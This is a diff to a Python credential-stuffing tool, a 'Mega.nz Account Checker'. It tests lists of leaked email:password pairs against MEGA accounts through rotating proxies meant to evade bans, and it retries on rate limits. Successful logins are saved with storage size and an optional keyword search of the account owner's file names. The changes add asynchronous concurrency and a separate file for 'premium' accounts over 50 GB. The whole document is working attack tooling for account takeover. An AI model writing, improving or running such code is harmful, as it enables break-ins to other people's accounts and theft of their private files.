@@ -1,15 +1,19 @@
 """
 Mega.nz Account Checker v3.0 by Thomas Hermes
-─────────────────────────────
-- Standalone MEGA API client (no mega.py / tenacity)
-- Proxy support (file-based rotation for anti-ban)
-- ThreadPoolExecutor with configurable thread count
-- Thread-safe counters and file writing
-- Exponential backoff retry logic
+─────────────────────────────────────────────
+- Standalone asynchronous MEGA API client (no mega.py / tenacity)
+- Asyncio concurrency with semaphore rate limiting
+- Proxy support (file-based round-robin and random rotation for anti-ban)
+- Thread-safe stats counters and file writing
+- Exponential backoff retry logic for temporary errors and rate limits
 - Graceful error handling with typed exceptions
 - Real-time console title updates via Win32 API
+- Optional file keyword search (omitted from logs and files when not specified)
+- Color-coded console logging: regular hits in green, premium accounts (> 50 GB) in bright pink
+- Dual-file export: all hits saved to hits_<name>.txt, premium accounts (> 50 GB) also saved to Hits_Premium.txt
+- Clean hit file formatting without combo row numbers
 
-Dependencies: requests, pycryptodome, colorama
+Dependencies: aiohttp, pycryptodome, colorama
 """
 
 import os
@@ -20,7 +24,7 @@ import importlib.util
 def install_dependencies():
     """Checks and installs missing dependencies."""
     required_libraries = [
-        ("requests", "requests"),
+        ("aiohttp", "aiohttp"),
         ("Crypto", "pycryptodome"),
         ("colorama", "colorama")
     ]
@@ -160,6 +164,34 @@ class FileWriter:
                 f.write(line + "\n")
 
 
+# Output file for accounts with storage capacity exceeding 50 GB
+PREMIUM_FILEPATH = "Hits_Premium.txt"
+_default_premium_writer = FileWriter(PREMIUM_FILEPATH)
+
+
+def parse_total_gb(total) -> float:
+    """
+    Safely parse total space value into float GB.
+    Supports numeric values as well as strings formatted with 'GB' or 'TB'.
+    """
+    if isinstance(total, (int, float)):
+        return float(total)
+    if isinstance(total, str):
+        cleaned = total.upper().strip()
+        if "TB" in cleaned:
+            cleaned = cleaned.replace("TB", "").strip()
+            try:
+                return float(cleaned) * 1024.0
+            except ValueError:
+                return 0.0
+        cleaned = cleaned.replace("GB", "").strip()
+        try:
+            return float(cleaned)
+        except ValueError:
+            return 0.0
+    return 0.0
+
+
 # ─── Proxy Pool ───────────────────────────────────────────────
 
 class ProxyPool:
@@ -222,8 +254,20 @@ def _safe_print(msg: str):
     with _print_lock:
         print(msg)
 
-def log_hit(msg: str):
-    _safe_print(f"{Fore.GREEN}[  HIT   ] {Style.RESET_ALL}{msg}")
+def log_hit(msg: str, is_premium: bool = False):
+    """
+    Log successful account hit to console.
+    Highlights in bright pink (Fore.LIGHTMAGENTA_EX) if is_premium (> 50 GB total space),
+    otherwise in green (Fore.GREEN).
+    """
+    if is_premium:
+        _safe_print(f"{Fore.LIGHTMAGENTA_EX}[  HIT   ] {Fore.LIGHTMAGENTA_EX}{msg}{Style.RESET_ALL}")
+    else:
+        _safe_print(f"{Fore.GREEN}[  HIT   ] {Style.RESET_ALL}{msg}")
+
+def log_hit_premium(msg: str):
+    """Log premium hit (total space > 50 GB) highlighted in bright pink."""
+    log_hit(msg, is_premium=True)
 
 def log_fail(msg: str):
     _safe_print(f"{Fore.RED}[  FAIL  ] {Style.RESET_ALL}{msg}")
@@ -260,8 +304,29 @@ async def check_account(
     writer: FileWriter,
     proxy_pool: ProxyPool,
     search_string: str = "",
-    semaphore: asyncio.Semaphore = None
+    semaphore: asyncio.Semaphore = None,
+    premium_writer: FileWriter = None,
 ):
+    """
+    Check a single MEGA account: authenticate, retrieve storage, optionally search keyword.
+
+    Workflow:
+      - Authenticates via MegaClient (using proxy from pool if available).
+      - Retrieves storage metrics (used_gb, total_gb).
+      - If search_string is specified, checks file names for the keyword.
+      - Formats hit lines:
+          * Console: includes [current/total] progress counter.
+          * Output files: clean format without combo row numbers.
+          * Keyword segment is omitted completely if no keyword was specified.
+      - If total space > 50 GB:
+          * Highlights [  HIT   ] in bright pink (Fore.LIGHTMAGENTA_EX).
+          * Appends hit to Hits_Premium.txt in addition to the main hits file.
+      - Handles retries on rate limits (-4) and temporary errors (-3, -6, -18).
+      - Classifies errors into Fail (auth error), Custom (blocked/overquota), or Error.
+    """
+    if premium_writer is None:
+        premium_writer = _default_premium_writer
+
     if semaphore:
         await semaphore.acquire()
         
@@ -277,15 +342,16 @@ async def check_account(
                 await client.login(email, password)
 
                 storage = await client.get_storage()
-                used_gb = storage['used_gb']
-                total_gb = storage['total_gb']
+                used_gb = storage.get('used_gb', 0)
+                total_gb = storage.get('total_gb', 0)
 
                 keyword_found = False
-                if search_string:
+                search_kw = search_string.strip() if search_string else ""
+                if search_kw:
                     try:
                         file_names = await client.get_file_names()
                         keyword_found = any(
-                            search_string.lower() in name.lower()
+                            search_kw.lower() in name.lower()
                             for name in file_names
                         )
                     except Exception:
@@ -294,16 +360,22 @@ async def check_account(
                 current = stats.inc_checked()
                 stats.inc_hits()
 
-                hit_line = (
-                    f"{email}:{password} | "
-                    f"Used: {used_gb}GB / {total_gb}GB | "
-                    f"Keyword: {search_string or 'N/A'} = "
-                    f"{'TRUE' if keyword_found else 'FALSE'} | "
-                    f"[{current}/{stats.total}]"
-                )
+                hit_parts = [
+                    f"{email}:{password}",
+                    f"Used: {used_gb}GB / {total_gb}GB"
+                ]
+                if search_kw:
+                    hit_parts.append(
+                        f"Keyword: {search_kw} = {'TRUE' if keyword_found else 'FALSE'}"
+                    )
+                file_hit_line = " | ".join(hit_parts)
+                console_hit_line = f"{file_hit_line} | [{current}/{stats.total}]"
 
-                log_hit(hit_line)
-                writer.write(hit_line)
+                is_premium = parse_total_gb(total_gb) > 50
+                log_hit(console_hit_line, is_premium=is_premium)
+                writer.write(file_hit_line)
+                if is_premium:
+                    premium_writer.write(file_hit_line)
                 return
 
             except MegaLoginError:
@@ -406,7 +478,7 @@ def print_logo():
     ╠══════════════════════════════════════════════════════╣
     ║  {Fore.GREEN}• Standalone MEGA API (zero bloat deps){Fore.CYAN}           ║
     ║  {Fore.GREEN}• Proxy rotation (HTTP/SOCKS5){Fore.CYAN}                    ║
-    ║  {Fore.GREEN}• Thread-safe multithreading{Fore.CYAN}                      ║
+    ║  {Fore.GREEN}• Asynchronous non-blocking engine{Fore.CYAN}                 ║
     ║  {Fore.GREEN}• Smart retry with backoff{Fore.CYAN}                        ║
     ║  {Fore.GREEN}• Keyword file search{Fore.CYAN}                             ║
     ╚══════════════════════════════════════════════════════╝
@@ -420,7 +492,7 @@ def print_logo():
         print("="*54)
         print("  * Standalone MEGA API")
         print("  * Proxy rotation")
-        print("  * Thread-safe multithreading")
+        print("  * Asynchronous non-blocking engine")
         print("="*54 + "\n")
 
 
@@ -446,6 +518,11 @@ def _title_updater(stats: Stats, filename: str, stop: threading.Event):
 # ─── MAIN ─────────────────────────────────────────────────────
 
 async def amain():
+    """
+    Main asynchronous execution entry point.
+    Interactively configures combo path, proxy pool, concurrency limit,
+    output filename, and optional keyword search before running checks.
+    """
     set_title("Mega.nz Checker v3.0 (Async)")
     print_logo()
 
@@ -508,6 +585,7 @@ async def amain():
 
     stats = Stats(total=len(pairs))
     writer = FileWriter(filename)
+    premium_writer = _default_premium_writer
 
     stop_event = threading.Event()
     threading.Thread(
@@ -524,7 +602,18 @@ async def amain():
     tasks = []
     for email, password in pairs:
         tasks.append(
-            asyncio.create_task(check_account(email, password, stats, writer, proxy_pool, search_string, semaphore))
+            asyncio.create_task(
+                check_account(
+                    email,
+                    password,
+                    stats,
+                    writer,
+                    proxy_pool,
+                    search_string,
+                    semaphore,
+                    premium_writer,
+                )
+            )
         )
         
     await asyncio.gather(*tasks, return_exceptions=True)
